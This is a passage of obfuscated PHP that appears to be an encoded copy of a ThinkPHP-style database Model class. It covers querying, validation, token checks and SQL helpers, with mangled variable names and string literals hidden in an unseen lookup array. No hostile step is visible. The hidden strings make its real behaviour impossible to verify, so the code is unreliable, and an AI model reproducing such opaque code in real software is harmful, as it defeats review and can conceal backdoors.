$_SERVER[©—Ò»ÅĞ]; if ($ÆíœÏã) { if (is_callable($ÆíœÏã)) { return call_user_func($ÆíœÏã, $úÊê»Å¿); } switch (strtolower($ÆíœÏã)) { case $Ó§üºµÁ[369]: return json_encode($úÊê»Å¿); case $Ó§üºµÁ[370]: return xml_encode($úÊê»Å¿); } } return $úÊê»Å¿; } public function parseFieldsMap($ÈíÍ®êş, $™Ö»š¼— = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ö•¼’Ÿ… => $«‡”èÀ±) { if ($™Ö»š¼— == 1) { if (isset($ÈíÍ®êş[$«‡”èÀ±])) { $ÈíÍ®êş[$Ö•¼’Ÿ…] = $ÈíÍ®êş[$«‡”èÀ±]; unset($ÈíÍ®êş[$«‡”èÀ±]); } } else { if (isset($ÈíÍ®êş[$Ö•¼’Ÿ…])) { $ÈíÍ®êş[$«‡”èÀ±] = $ÈíÍ®êş[$Ö•¼’Ÿ…]; unset($ÈíÍ®êş[$Ö•¼’Ÿ…]); } } } } return $ÈíÍ®êş; } public function setField($óŞ»ÜŞ–, $¹„¤¦È¢ = '') { if (is_array($óŞ»ÜŞ–)) { $ñ÷óÂÉÕ = $óŞ»ÜŞ–; } else { $ñ÷óÂÉÕ[$óŞ»ÜŞ–] = $¹„¤¦È¢; } return $this->save($ñ÷óÂÉÕ); } public function setAdd($âõ¯”ß, $À‘ªÇ¤ú = 1) { $¢½õÌâ =& $_SERVER[©—Ò»ÅĞ]; $ˆ¿Å¸îó = $âõ¯”ß . $¢½õÌâ[371] . $À‘ªÇ¤ú; if ($À‘ªÇ¤ú < 0) { $ˆ¿Å¸îó = $âõ¯”ß . $À‘ªÇ¤ú; } return $this->setField($âõ¯”ß, array($¢½õÌâ[372], $ˆ¿Å¸îó)); } public function getField($¥¬¥áş‰, $§Ğ÷İ¥ = null) { $ŠçïİØÅ =& $_SERVER[©—Ò»ÅĞ]; $§«ÂÖ“Û[$ŠçïİØÅ[351]] = $¥¬¥áş‰; $§«ÂÖ“Û = $this->_parseOptions($§«ÂÖ“Û); $¥¬¥áş‰ = trim($¥¬¥áş‰); if (strpos($¥¬¥áş‰, $ŠçïİØÅ[50])) { if (!isset($§«ÂÖ“Û[$ŠçïİØÅ[368]])) { $§«ÂÖ“Û[$ŠçïİØÅ[368]] = is_numeric($§Ğ÷İ¥) ? $§Ğ÷İ¥ : $ŠçïİØÅ[12]; } $»—§Ù¢à = $this->db->select($§«ÂÖ“Û); if (!empty($»—§Ù¢à)) { $¤ÂÌ–ª½ = explode($ŠçïİØÅ[50], $¥¬¥áş‰); $¥¬¥áş‰ = array_keys($»—§Ù¢à[0]); $ìêÁÑ¦Ş = array_shift($¥¬¥áş‰); $ğ›áà ¹ = array_shift($¥¬¥áş‰); $„«³”—® = array(); $Ç«Óôß = count($¤ÂÌ–ª½); foreach ($»—§Ù¢à as $Ÿ·­) { $Ú‰©¾½ = $Ÿ·­[$ìêÁÑ¦Ş]; if (2 == $Ç«Óôß) { $„«³”—®[$Ú‰©¾½] = $Ÿ·­[$ğ›áà ¹]; } else { $„«³”—®[$Ú‰©¾½] = is_string($§Ğ÷İ¥) ? implode($§Ğ÷İ¥, $Ÿ·­) : $Ÿ·­; } } return $„«³”—®; } } else { if (!0 !== $§Ğ÷İ¥) { $§«ÂÖ“Û[$ŠçïİØÅ[368]] = is_numeric($§Ğ÷İ¥) ? $§Ğ÷İ¥ : 1; } if ($§Ğ÷İ¥ === $ŠçïİØÅ[332]) { unset($§«ÂÖ“Û[$ŠçïİØÅ[368]]); } $Ÿ·­ = $this->db->select($§«ÂÖ“Û); if (!empty($Ÿ·­)) { if ($§Ğ÷İ¥ === $ŠçïİØÅ[332]) { return reset($Ÿ·­[0]); } if (!0 !== $§Ğ÷İ¥ && 1 == $§«ÂÖ“Û[$ŠçïİØÅ[368]]) { return reset($Ÿ·­[0]); } foreach ($Ÿ·­ as $¤Æ†´É¦) { $Æ¨÷¦ºŸ[] = $¤Æ†´É¦[$¥¬¥áş‰]; } return $Æ¨÷¦ºŸ; } } return null; } public function create($ºéşœ = '', $™šˆÔ’ = '') { $Ü­Ùø»î =& $_SERVER[©—Ò»ÅĞ]; if (empty($ºéşœ)) { $ºéşœ = $_POST; } elseif (is_object($ºéşœ)) { $ºéşœ = get_object_vars($ºéşœ); } if (empty($ºéşœ) || !is_array($ºéşœ)) { $this->error = think_lang($Ü­Ùø»î[349]); return !1; } $ºéşœ = $this->parseFieldsMap($ºéşœ, 0); $™šˆÔ’ = $™šˆÔ’ ? $™šˆÔ’ : (!empty($ºéşœ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ü­Ùø»î[351]])) { $üÕ²ÒÄÀ = $this->options[$Ü­Ùø»î[351]]; unset($this->options[$Ü­Ùø»î[351]]); } elseif ($™šˆÔ’ == THINK_MODEL_INSERT && isset($this->insertFields)) { $üÕ²ÒÄÀ = $this->insertFields; } elseif ($™šˆÔ’ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $üÕ²ÒÄÀ = $this->updateFields; } if (isset($üÕ²ÒÄÀ)) { if (is_string($üÕ²ÒÄÀ)) { $üÕ²ÒÄÀ = explode($Ü­Ùø»î[50], $üÕ²ÒÄÀ); } if (think_config($Ü­Ùø»î[373])) { $üÕ²ÒÄÀ[] = think_config($Ü­Ùø»î[374]); } foreach ($ºéşœ as $¹”ªÑŞÍ => $‡­şÑŸı) { if (!in_array($¹”ªÑŞÍ, $üÕ²ÒÄÀ)) { unset($ºéşœ[$¹”ªÑŞÍ]); } } } if (!$this->autoValidation($ºéşœ, $™šˆÔ’)) { return !1; } if (!$this->autoCheckToken($ºéşœ)) { $this->error = think_lang($Ü­Ùø»î[375]); return !1; } if ($this->autoCheckFields) { $üÕ²ÒÄÀ = $this->getDbFields(); foreach ($ºéşœ as $¹”ªÑŞÍ => $‡­şÑŸı) { if (!in_array($¹”ªÑŞÍ, $üÕ²ÒÄÀ)) { unset($ºéşœ[$¹”ªÑŞÍ]); } elseif (MAGIC_QUOTES_GPC && is_string($‡­şÑŸı)) { $ºéşœ[$¹”ªÑŞÍ] = stripslashes($‡­şÑŸı); } } } $this->autoOperation($ºéşœ, $™šˆÔ’); $this->data = $ºéşœ; return $ºéşœ; } public function autoCheckToken($¿Êı©Ôæ) { $ˆÑ¬£í  =& $_SERVER[©—Ò»ÅĞ]; if (isset($this->options[$ˆÑ¬£í [376]]) && !$this->options[$ˆÑ¬£í [376]]) { return !0; } if (think_config($ˆÑ¬£í [373])) { $‰Í«Ì¶ = think_config($ˆÑ¬£í [374]); if (!isset($¿Êı©Ôæ[$‰Í«Ì¶]) || Session::get($‰Í«Ì¶)) { return !1; } list($ù´×”Ğ, $ê¯áŞÉƒ) = explode($ˆÑ¬£í [11], $¿Êı©Ôæ[$‰Í«Ì¶]); if ($ê¯áŞÉƒ && Session::get($‰Í«Ì¶ . $ˆÑ¬£í [10] . $ù´×”Ğ) === $ê¯áŞÉƒ) { Session::remove($‰Í«Ì¶ . $ˆÑ¬£í [10] . $ù´×”Ğ); return !0; } if (think_config($ˆÑ¬£í [377])) { Session::remove($‰Í«Ì¶ . $ˆÑ¬£í [10] . $ù´×”Ğ); } return !1; } return !0; } public function regex($Ö»×ØœÅ, $¼°Êü) { $âÙİ”£è =& $_SERVER[©—Ò»ÅĞ]; $äÚ¨Í† = array($âÙİ”£è[378] => $âÙİ”£è[379], $âÙİ”£è[380] => $âÙİ”£è[381], $âÙİ”£è[382] => $âÙİ”£è[383], $âÙİ”£è[384] => $âÙİ”£è[385], $âÙİ”£è[386] => $âÙİ”£è[387], $âÙİ”£è[388] => $âÙİ”£è[389], $âÙİ”£è[390] => $âÙİ”£è[391], $âÙİ”£è[366] => $âÙİ”£è[392], $âÙİ”£è[393] => $âÙİ”£è[394]); if (isset($äÚ¨Í†[strtolower($¼°Êü)])) { $¼°Êü = $äÚ¨Í†[strtolower($¼°Êü)]; } return preg_match($¼°Êü, $Ö»×ØœÅ) === 1; } private function autoOperation(&$Â½çşëÇ, $ µ¬õÃŠ) { $Â¢‚ìÔ =& $_SERVER[©—Ò»ÅĞ]; if (!empty($this->options[$Â¢‚ìÔ[395]])) { $¶«Âìşâ = $this->options[$Â¢‚ìÔ[395]]; unset($this->options[$Â¢‚ìÔ[395]]); } elseif (!empty($this->_auto)) { $¶«Âìşâ = $this->_auto; } if (isset($¶«Âìşâ)) { foreach ($¶«Âìşâ as $ÛªÑÛ‘×) { if (empty($ÛªÑÛ‘×[2])) { $ÛªÑÛ‘×[2] = THINK_MODEL_INSERT; } if ($ µ¬õÃŠ == $ÛªÑÛ‘×[2] || $ÛªÑÛ‘×[2] == THINK_MODEL_BOTH) { switch (trim($ÛªÑÛ‘×[3])) { case $Â¢‚ìÔ[396]: case $Â¢‚ìÔ[397]: $©£®ÄÖ = isset($ÛªÑÛ‘×[4]) ? (array) $ÛªÑÛ‘×[4] : array(); if (isset($Â½çşëÇ[$ÛªÑÛ‘×[0]])) { array_unshift($©£®ÄÖ, $Â½çşëÇ[$ÛªÑÛ‘×[0]]); } if ($Â¢‚ìÔ[396] == $ÛªÑÛ‘×[3]) { $Â½çşëÇ[$ÛªÑÛ‘×[0]] = call_user_func_array($ÛªÑÛ‘×[1], $©£®ÄÖ); } else { $Â½çşëÇ[$ÛªÑÛ‘×[0]] = call_user_func_array(array(&$this, $ÛªÑÛ‘×[1]), $©£®ÄÖ); } break; case $Â¢‚ìÔ[351]: $Â½çşëÇ[$ÛªÑÛ‘×[0]] = $Â½çşëÇ[$ÛªÑÛ‘×[1]]; break; case $Â¢‚ìÔ[398]: if ($Â¢‚ìÔ[12] === $Â½çşëÇ[$ÛªÑÛ‘×[0]]) { unset($Â½çşëÇ[$ÛªÑÛ‘×[0]]); } break; case $Â¢‚ìÔ[399]: default: $Â½çşëÇ[$ÛªÑÛ‘×[0]] = $ÛªÑÛ‘×[1]; } if (!1 === $Â½çşëÇ[$ÛªÑÛ‘×[0]]) { unset($Â½çşëÇ[$ÛªÑÛ‘×[0]]); } } } } return $Â½çşëÇ; } protected function autoValidation($”Ü«Å, $ˆ®Ïáï›) { $òèˆÍ†â =& $_SERVER[©—Ò»ÅĞ]; if (!empty($this->options[$òèˆÍ†â[400]])) { $ëÚğâ“ = $this->options[$òèˆÍ†â[400]]; unset($this->options[$òèˆÍ†â[400]]); } elseif (!empty($this->_validate)) { $ëÚğâ“ = $this->_validate; } if (isset($ëÚğâ“)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ëÚğâ“ as $Š˜øÏ¥Í => $ÏÌ”¥ü‹) { if (empty($ÏÌ”¥ü‹[5]) || $ÏÌ”¥ü‹[5] == THINK_MODEL_BOTH || $ÏÌ”¥ü‹[5] == $ˆ®Ïáï›) { if (0 == strpos($ÏÌ”¥ü‹[2], $òèˆÍ†â[401]) && strpos($ÏÌ”¥ü‹[2], $òèˆÍ†â[402])) { $ÏÌ”¥ü‹[2] = think_lang(substr($ÏÌ”¥ü‹[2], 2, -1)); } $ÏÌ”¥ü‹[3] = isset($ÏÌ”¥ü‹[3]) ? $ÏÌ”¥ü‹[3] : THINK_EXISTS_VALIDATE; $ÏÌ”¥ü‹[4] = isset($ÏÌ”¥ü‹[4]) ? $ÏÌ”¥ü‹[4] : $òèˆÍ†â[403]; switch ($ÏÌ”¥ü‹[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($”Ü«Å, $ÏÌ”¥ü‹)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($òèˆÍ†â[12] != trim($”Ü«Å[$ÏÌ”¥ü‹[0]])) { if (!1 === $this->_validationField($”Ü«Å, $ÏÌ”¥ü‹)) { return !1; } } break; default: if (isset($”Ü«Å[$ÏÌ”¥ü‹[0]])) { if (!1 === $this->_validationField($”Ü«Å, $ÏÌ”¥ü‹)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($†ß£˜¹•, $·İËµğ) { if (!1 === $this->_validationFieldItem($†ß£˜¹•, $·İËµğ)) { if ($this->patchValidate) { $this->error[$·İËµğ[0]] = $·İËµğ[2]; } else { $this->error = $·İËµğ[2]; return !1; } } return; } protected function _validationFieldItem($÷Üë¼‚, $™ôÙìÓû) { $“ü¨Îª  =& $_SERVER[©—Ò»ÅĞ]; switch (strtolower(trim($™ôÙìÓû[4]))) { case $“ü¨Îª [396]: case $“ü¨Îª [397]: $ÓáÔÌåº = isset($™ôÙìÓû[6]) ? (array) $™ôÙìÓû[6] : array(); if (is_string($™ôÙìÓû[0]) && strpos($™ôÙìÓû[0], $“ü¨Îª [50])) { $™ôÙìÓû[0] = explode($“ü¨Îª [50], $™ôÙìÓû[0]); } if (is_array($™ôÙìÓû[0])) { foreach ($™ôÙìÓû[0] as $ùæ¤×ò‘) { $«ùÆİ[$ùæ¤×ò‘] = $÷Üë¼‚[$ùæ¤×ò‘]; } array_unshift($ÓáÔÌåº, $«ùÆİ); } else { array_unshift($ÓáÔÌåº, $÷Üë¼‚[$™ôÙìÓû[0]]); } if ($“ü¨Îª [396] == $™ôÙìÓû[4]) { return call_user_func_array($™ôÙìÓû[1], $ÓáÔÌåº); } else { return call_user_func_array(array(&$this, $™ôÙìÓû[1]), $ÓáÔÌåº); } case $“ü¨Îª [404]: return $÷Üë¼‚[$™ôÙìÓû[0]] == $÷Üë¼‚[$™ôÙìÓû[1]]; case $“ü¨Îª [405]: if (is_string($™ôÙìÓû[0]) && strpos($™ôÙìÓû[0], $“ü¨Îª [50])) { $™ôÙìÓû[0] = explode($“ü¨Îª [50], $™ôÙìÓû[0]); } $È¹î¬è‹ = array(); if (is_array($™ôÙìÓû[0])) { foreach ($™ôÙìÓû[0] as $ùæ¤×ò‘) { $È¹î¬è‹[$ùæ¤×ò‘] = $÷Üë¼‚[$ùæ¤×ò‘]; } } else { $È¹î¬è‹[$™ôÙìÓû[0]] = $÷Üë¼‚[$™ôÙìÓû[0]]; } if (!empty($÷Üë¼‚[$this->getPk()])) { $È¹î¬è‹[$this->getPk()] = array($“ü¨Îª [406], $÷Üë¼‚[$this->getPk()]); } if ($this->where($È¹î¬è‹)->find()) { return !1; } return !0; default: return $this->check($÷Üë¼‚[$™ôÙìÓû[0]], $™ôÙìÓû[1], $™ôÙìÓû[4]); } } public function check($½¿ËÜÕö, $ĞóÖ«õ¥, $©ÈµÜğö = "\x72\x65\x67\x65\170") { $§Ïğ×Íš =& $_SERVER[©—Ò»ÅĞ]; $©ÈµÜğö = strtolower(trim($©ÈµÜğö)); switch ($©ÈµÜğö) { case $§Ïğ×Íš[7]: case $§Ïğ×Íš[407]: $Ë…ìÎÜİ = is_array($ĞóÖ«õ¥) ? $ĞóÖ«õ¥ : explode($§Ïğ×Íš[50], $ĞóÖ«õ¥); return $©ÈµÜğö == $§Ïğ×Íš[7] ? in_array($½¿ËÜÕö, $Ë…ìÎÜİ) : !in_array($½¿ËÜÕö, $Ë…ìÎÜİ); case $§Ïğ×Íš[408]: case $§Ïğ×Íš[409]: if (is_array($ĞóÖ«õ¥)) { $ß–Ô»ÜÍ = $ĞóÖ«õ¥[0]; $™øíà™½ = $ĞóÖ«õ¥[1]; } else { list($ß–Ô»ÜÍ, $™øíà™½) = explode($§Ïğ×Íš[50], $ĞóÖ«õ¥); } return $©ÈµÜğö == $§Ïğ×Íš[408] ? $½¿ËÜÕö >= $ß–Ô»ÜÍ && $½¿ËÜÕö <= $™øíà™½ : $½¿ËÜÕö < $ß–Ô»ÜÍ || $½¿ËÜÕö > $™øíà™½; case $§Ïğ×Íš[410]: case $§Ïğ×Íš[411]: return $©ÈµÜğö == $§Ïğ×Íš[410] ? $½¿ËÜÕö == $ĞóÖ«õ¥ : $½¿ËÜÕö != $ĞóÖ«õ¥; case $§Ïğ×Íš[412]: $Ø¼ü†Çì = mb_strlen($½¿ËÜÕö, $§Ïğ×Íš[413]); if (strpos($ĞóÖ«õ¥, $§Ïğ×Íš[50])) { list($ß–Ô»ÜÍ, $™øíà™½) = explode($§Ïğ×Íš[50], $ĞóÖ«õ¥); return $Ø¼ü†Çì >= $ß–Ô»ÜÍ && $Ø¼ü†Çì <= $™øíà™½; } else { return $Ø¼ü†Çì == $ĞóÖ«õ¥; } case $§Ïğ×Íš[414]: list($ƒ’£íÔ, $·Üë¼œ) = explode($§Ïğ×Íš[50], $ĞóÖ«õ¥); if (!is_numeric($ƒ’£íÔ)) { $ƒ’£íÔ = strtotime($ƒ’£íÔ); } if (!is_numeric($·Üë¼œ)) { $·Üë¼œ = strtotime($·Üë¼œ); } return NOW_TIME >= $ƒ’£íÔ && NOW_TIME <= $·Üë¼œ; case $§Ïğ×Íš[415]: return in_array(get_client_ip(), explode($§Ïğ×Íš[50], $ĞóÖ«õ¥)); case $§Ïğ×Íš[416]: return !in_array(get_client_ip(), explode($§Ïğ×Íš[50], $ĞóÖ«õ¥)); case $§Ïğ×Íš[403]: default: return $this->regex($½¿ËÜÕö, $ĞóÖ«õ¥); } } public function query($ÉíÌ®Úå, $®¹Áøè = false) { $ÓüÜ‘© =& $_SERVER[©—Ò»ÅĞ]; if (!is_bool($®¹Áøè) && !is_array($®¹Áøè)) { $®¹Áøè = func_get_args(); array_shift($®¹Áøè); } $ÉíÌ®Úå = str_replace(array($ÓüÜ‘©[285], $ÓüÜ‘©[417]), $ÓüÜ‘©[53], $ÉíÌ®Úå); $ÉíÌ®Úå = $this->parseSql($ÉíÌ®Úå, $®¹Áøè); return $this->db->query($ÉíÌ®Úå); } public function execute($éèş“™ì, $ÎàÏ‡—¯ = false) { if (!is_bool($ÎàÏ‡—¯) && !is_array($ÎàÏ‡—¯)) { $ÎàÏ‡—¯ = func_get_args(); array_shift($ÎàÏ‡—¯); } $éèş“™ì = $this->parseSql($éèş“™ì, $ÎàÏ‡—¯); return $this->db->execute($éèş“™ì); } protected function parseSql($ğÉÄ„ÃÁ, $¬è›æëô) { $éò‘“ÌÇ =& $_SERVER[©—Ò»ÅĞ]; if (!0 === $¬è›æëô) { $¸ÖÀÜ“ = $this->_parseOptions(); $ğÉÄ„ÃÁ = $this->db->parseSql($ğÉÄ„ÃÁ, $¸ÖÀÜ“); } elseif (is_array($¬è›æëô)) { $¬è›æëô = array_map(array($this->db, $éò‘“ÌÇ[418]), $¬è›æëô); $ğÉÄ„ÃÁ = vsprintf($ğÉÄ„ÃÁ, $¬è›æëô); } else { $ğÉÄ„ÃÁ = strtr($ğÉÄ„ÃÁ, array($éò‘“ÌÇ[419] => $this->getTableName(), $éò‘“ÌÇ[420] => think_config($éò‘“ÌÇ[321]))); } $this->db->setModel($this->name); return $ğÉÄ„ÃÁ; } public function db($õıŠµ„´ = '', $¥°ğÄ°º = '', $¤Š‘‚¿ = array()) { $ò‡Ã“ú =& $_SERVER[©—Ò»ÅĞ]; if ($ò‡Ã“ú[12] === $õıŠµ„´ && $this->db) { return $this->db; } static $›•¡¢ĞÍ = array(); static $–€™ñ¤€ = array(); if (!isset($–€™ñ¤€[$õıŠµ„´]) || isset($–€™ñ¤€[$õıŠµ„´]) && $¥°ğÄ°º && $›•¡¢ĞÍ[$õıŠµ„´] != $¥°ğÄ°º) { if (!empty($¥°ğÄ°º) && is_string($¥°ğÄ°º) && !1 === strpos($¥°ğÄ°º, $ò‡Ã“ú[8])) { $¥°ğÄ°º = think_config($¥°ğÄ°º); } $õıŠµ„´ = think_guid($¥°ğÄ°º); $–€™ñ¤€[$õıŠµ„´] = Db::getInstance($¥°ğÄ°º); } elseif (NULL === $¥°ğÄ°º) { $–€™ñ¤€[$õıŠµ„´]->close(); unset($–€™ñ¤€[$õıŠµ„´]); return; } if (!empty($¤Š‘‚¿)) { if (is_string($¤Š‘‚¿)) { parse_str($¤Š‘‚¿, $¤Š‘‚¿); } foreach ($¤Š‘‚¿ as $€‹ê¼«¢ => $Ğ†å‰¥¹) { $this->setProperty($€‹ê¼«¢, $Ğ†å‰¥¹); } } $›•¡¢ĞÍ[$õıŠµ„´] = $¥°ğÄ°º; $this->db = $–€™ñ¤€[$õıŠµ„´]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $ã©ûÎ„İ = get_class($this); if ($ã©ûÎ„İ == $_SERVER[©—Ò»ÅĞ][421]) { return $this->name; } $this->name = substr($ã©ûÎ„İ, 0, -5); } return $this->name; } public function getTableName() { $ßóøŒÒ  =& $_SERVER[©—Ò»ÅĞ]; if (empty($this->trueTableName)) { $ÍÍ›¶ÊÊ = !empty($this->tablePrefix) ? $this->tablePrefix : $ßóøŒÒ [12]; if (!empty($this->tableName)) { $ÍÍ›¶ÊÊ .= $this->tableName; } else { $ÍÍ›¶ÊÊ .= think_parse_name($this->name); } $this->trueTableName = strtolower($ÍÍ›¶ÊÊ); } return (!empty($this->dbName) ? $this->dbName . $ßóøŒÒ [10] : $ßóøŒÒ [12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $•”í§×¤ =& $_SERVER[©—Ò»ÅĞ]; return isset($this->fields[$•”í§×¤[328]]) ? $this->fields[$•”í§×¤[328]] : $this->pk; } public function getDbFields() { $¯™²ˆšŠ =& $_SERVER[©—Ò»ÅĞ]; if (isset($this->options[$¯™²ˆšŠ[357]])) { $ÀüÆñ¹Ú = $this->db->getFields($this->options[$¯™²ˆšŠ[357]]); return $ÀüÆñ¹Ú ? array_keys($ÀüÆñ¹Ú) : !1; } if ($this->fields) { $ÀüÆñ¹Ú = $this->fields; unset($ÀüÆñ¹Ú[$¯™²ˆšŠ[327]], $ÀüÆñ¹Ú[$¯™²ˆšŠ[328]], $ÀüÆñ¹Ú[$¯™²ˆšŠ[329]], $ÀüÆñ¹Ú[$¯™²ˆšŠ[326]]); return $ÀüÆñ¹Ú; } return !1; } public function data($ßÍÇ€° = '') { $ÓÁ·ôãù =& $_SERVER[©—Ò»ÅĞ]; if ($ÓÁ·ôãù[12] === $ßÍÇ€° && !empty($this->data)) { return $this->data; } if (is_object($ßÍÇ€°)) { $ßÍÇ€° = get_object_vars($ßÍÇ€°); } elseif (is_string($ßÍÇ€°)) { parse_str($ßÍÇ€°, $ßÍÇ€°); } elseif (!is_array($ßÍÇ€°)) { think_exception(think_lang($ÓÁ·ôãù[349])); } $this->data = $ßÍÇ€°; return $this; } public function join($øüë‰â) { $•îµé‰ç =& $_SERVER[©—Ò»ÅĞ]; if (is_array($øüë‰â)) { $this->options[$•îµé‰ç[360]] = $øüë‰â; } elseif (!empty($øüë‰â)) { $this->options[$•îµé‰ç[360]][] = $øüë‰â; } return $this; } public function union($æ›Í×†°, $¸ËäÔ¾õ = false) { $«íÈæÎÔ =& $_SERVER[©—Ò»ÅĞ]; if (empty($æ›Í×†°)) { return $this; } if ($¸ËäÔ¾õ) { $this->options[$«íÈæÎÔ[422]][$«íÈæÎÔ[423]] = !0; } if (is_object($æ›Í×†°)) { $æ›Í×†° = get_object_vars($æ›Í×†°); } if (is_string($æ›Í×†°)) { $²òÜ½‰“ = $æ›Í×†°; } elseif (is_array($æ›Í×†°)) { if (isset($æ›Í×†°[0])) { $this->options[$«íÈæÎÔ[422]] = array_merge($this->options[$«íÈæÎÔ[422]], $æ›Í×†°); return $this; } else { $²òÜ½‰“ = $æ›Í×†°; } } else { think_exception(think_lang($«íÈæÎÔ[349])); } $this->options[$«íÈæÎÔ[422]][] = $²òÜ½‰“; return $this; } public function cache($¸¨¿Ò¿¢ = true, $Ó‘âï‡¬ = null, $Ä¾ÂÇÖí = '') { $®Ú‡ÈÏï =& $_SERVER[©—Ò»ÅĞ]; if (!1 !== $¸¨¿Ò¿¢) { $this->options[$®Ú‡ÈÏï[424]] = array($®Ú‡ÈÏï[95] => $¸¨¿Ò¿¢, $®Ú‡ÈÏï[414] => $Ó‘âï‡¬, $®Ú‡ÈÏï[33] => $Ä¾ÂÇÖí); } return $this; } public function field($£§±õ, $ï€½Ü°à = false) { $„¨’Şª³ =& $_SERVER[©—Ò»ÅĞ]; if (!0 === $£§±õ) { $±ù°‡²ù = $this->getDbFields(); $£§±õ = $±ù°‡²ù ? $±ù°‡²ù : $„¨’Şª³[220]; } elseif ($ï€½Ü°à) { if (is_string($£§±õ)) { $£§±õ = explode($„¨’Şª³[50], $£§±õ); } $±ù°‡²ù = $this->getDbFields(); $£§±õ = $±ù°‡²ù ? array_diff($±ù°‡²ù, $£§±õ) : $£§±õ; } $this->options[$„¨’Şª³[351]] = $£§±õ; return $this; } public function scope($¡÷´¾ŒŠ = '', $ÑÑ€‘şĞ = NULL) { $òã¨›ÌÇ =& $_SERVER[©—Ò»ÅĞ]; if ($òã¨›ÌÇ[12] === $¡÷´¾ŒŠ) { if (isset($this->_scope[$òã¨›ÌÇ[37]])) { $çí¸‰õş = $this->_scope[$òã¨›ÌÇ[37]]; } else { return $this; } } elseif (is_string($¡÷´¾ŒŠ)) { $ûïÅ’Ñì = explode($òã¨›ÌÇ[50], $¡÷´¾ŒŠ); $çí¸‰õş = array(); foreach ($ûïÅ’Ñì as $ĞÍ¯å¿) { if (!isset($this->_scope[$ĞÍ¯å¿])) { continue; } $çí¸‰õş = array_merge($çí¸‰õş, $this->_scope[$ĞÍ¯å¿]); } if (!empty($ÑÑ€‘şĞ) && is_array($ÑÑ€‘şĞ)) { $çí¸‰õş = array_merge($çí¸‰õş, $ÑÑ€‘şĞ); } } elseif (is_array($¡÷´¾ŒŠ)) { $çí¸‰õş = $¡÷´¾ŒŠ; } if (is_array($çí¸‰õş) && !empty($çí¸‰õş)) { $this->options = array_merge($this->options, array_change_key_case($çí¸‰õş)); } return $this; } public function where($ÃÉÌĞ, $èÁ×¿«† = null) { $¹ğ¶üÎ =& $_SERVER[©—Ò»ÅĞ]; if (!is_null($èÁ×¿«†) && is_string($ÃÉÌĞ)) { if (!is_array($èÁ×¿«†)) { $èÁ×¿«† = func_get_args(); array_shift($èÁ×¿«†); } $èÁ×¿«† = array_map(array($this->db, $¹ğ¶üÎ[418]), $èÁ×¿«†); $ÃÉÌĞ = vsprintf($ÃÉÌĞ, $èÁ×¿«†); } elseif (is_object($ÃÉÌĞ)) { $ÃÉÌĞ = get_object_vars($ÃÉÌĞ); } elseif (is_array($ÃÉÌĞ)) { foreach ($ÃÉÌĞ as $®ß—áô¯ => $Ú÷ñõ‰â) { if ((is_numeric($®ß—áô¯) || !$®ß—áô¯) && is_string($Ú÷ñõ‰â)) { if (strpos($Ú÷ñõ‰â, $¹ğ¶üÎ[425]) === 0) { continue; } think_trace($¹ğ¶üÎ[426], $¹ğ¶üÎ[12], $¹ğ¶üÎ[49]); die; } } } if (is_string($ÃÉÌĞ) && $¹ğ¶üÎ[12] != $ÃÉÌĞ) { $°Êş¯µó = array(); $°Êş¯µó[$¹ğ¶üÎ[427]] = $ÃÉÌĞ; $ÃÉÌĞ = $°Êş¯µó; } if (isset($this->options[$¹ğ¶üÎ[353]])) { $this->options[$¹ğ¶üÎ[353]] = array_merge($this->options[$¹ğ¶üÎ[353]], $ÃÉÌĞ); } else { $this->options[$¹ğ¶üÎ[353]] = $ÃÉÌĞ; } return $this; } public function limit($µ…Ş¿Ğ, $áÛÉ§‘Ô = null) { $ëƒ…—¢½ =& $_SERVER[©—Ò»ÅĞ]; $this->options[$ëƒ…—¢½[368]] = is_null($áÛÉ§‘Ô) ? $µ…Ş¿Ğ : $µ…Ş¿Ğ . $ëƒ…—¢½[50] . $áÛÉ§‘Ô; return $this; } public function page($‚¡’ï€ß, $Á”Ğ›§¦ = null) { $é¾²ê· =& $_SERVER[©—Ò»ÅĞ]; $this->options[$é¾²ê·[428]] = is_null($Á”Ğ›§¦) ? $‚¡’ï€ß : $‚¡’ï€ß . $é¾²ê·[50] . $Á”Ğ›§¦; return $this; } public function comment($»—ŒÔñ—) { $this->options[$_SERVER[©—Ò»ÅĞ][429]] = $»—ŒÔñ—; return $this; } public function setProperty($š€Â ˜, $Í“êìµ“) { if (property_exists($this, $š€Â ˜)) { $this->{$š€Â ˜} = $Í“êìµ“; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\x69\146\x79\x54\151\155\145", "\164\151\155\x65", "\x69\x6e\x73\145\x72\x74\x2c\x75\x70\144\141\164\x65", "\146\x75\x6e\x63\x74\x69\x6f\156"), array("\143\162\x65\x61\164\145\124\x69\x6d\145", "\164\151\155\x65", "\151\156\x73\145\162\164", "\146\165\156\143\x74\151\x6f\156")); public function setDataAuto($Ø­‡ËÚ±) { $this->dataAuto = $Ø­‡ËÚ±; } public function __construct($ßĞ„‰ÑË = '', $ª½«éØ‚ = '', $ø°şã€ = '') { parent::__construct($ßĞ„‰ÑË, $ª½«éØ‚, $ø°şã€); } protected $tableMeta = array(); protected function _beforeInsert(&$¶âÆ¨Ìœ, $œñÄµ«) { $˜ŸåÍƒÛ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->checkDataAutoHas($˜ŸåÍƒÛ[430])) { return; } $this->dataBeforeFilter($¶âÆ¨Ìœ, $˜ŸåÍƒÛ[430]); } protected function _beforeUpdate(&$ïŞ‘ìö¢, $¤ò¹‹İà) { $ßØ‹Å¾ =& $_SERVER[©—Ò»ÅĞ]; if (!$this->checkDataAutoHas($ßØ‹Å¾[431])) { return; } $this->dataBeforeFilter($ïŞ‘ìö¢, $ßØ‹Å¾[431]); } protected 